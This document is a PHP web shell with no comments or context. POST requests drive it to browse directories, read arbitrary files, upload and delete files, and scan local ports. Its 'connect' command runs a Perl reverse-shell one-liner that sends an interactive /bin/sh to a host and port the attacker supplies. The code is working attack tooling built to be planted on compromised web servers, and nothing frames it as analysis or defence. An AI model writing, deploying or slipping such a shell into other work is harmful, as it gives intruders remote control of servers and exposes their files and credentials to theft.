<?php
session_start();
if ( !isset($_POST["request"]) ) {
    die();
}

if (!isset($_SESSION["cd"])) {
    $_SESSION["cd"] = getcwd();
}

$commands = array(
    "pwd" => function() { return $_SESSION["cd"]; },
    "dir" => function() { 
        $res = "";
        foreach (scandir($_SESSION["cd"]) as $key => $val) {
            if ($val != "." && $val != "..") {
                $res .= ($val . "\n");
            }
        }
        return $res;
     },
    "cd" => function() {
        if (!isset($_POST["value"])) {
            die();
        }

        if (chdir($_POST["value"])) {
            $_SESSION["cd"] = getcwd();
            return getcwd();
        }
    },
    "connect" => function() {
        $cmd = "perl -e 'use Socket;\$i=\"" . $_POST["value"] . "\";\$p=" . $_POST["value2"] . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
        system($cmd);
    },
    "my_ip" => function() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
          $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
          $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
          $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    },
    "upload" => function() {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $_SESSION["cd"] . "/" . $_FILES["fileToUpload"]["name"])) {
            return "The file '". basename( $_FILES["fileToUpload"]["name"]). "' has been uploaded.";
        } else {
            return "Sorry, there was an error uploading your file.";
        }
    },
    "cat" => function() {
        $content = file_get_contents($_POST["value"]);
        return $content;
    },
    "port_scan" => function() {
        $start = (int) $_POST["sport"];
        $end = (int) $_POST["eport"];
        $host = "localhost";
        $res = "";
        for($i = $start; $i <= $end; $i++){
            $fp = fsockopen($host, $i, $errno, $errstr, 3);
            if($fp) {
                $res .= ($i . "\n");
            }
            flush();
        }
        return $res;
    },
    "touch" => function() {
        $f = fopen($_POST["value"], "w+");
        fwrite($f, "");
        fclose($f);
        return $_SESSION["cd"] . "/" . $_POST["value"];
    },
    "mkdir" => function() {
        mkdir($_POST["value"]);
        return $_SESSION["cd"] . "/" . $_POST["value"];
    },
    "del" => function() {
        unlink($_POST["value"]);
    }
);

foreach ($commands as $key => $val) {
    if ($_POST["request"] == $key) {
        echo $commands[$key]();
    }
}

?>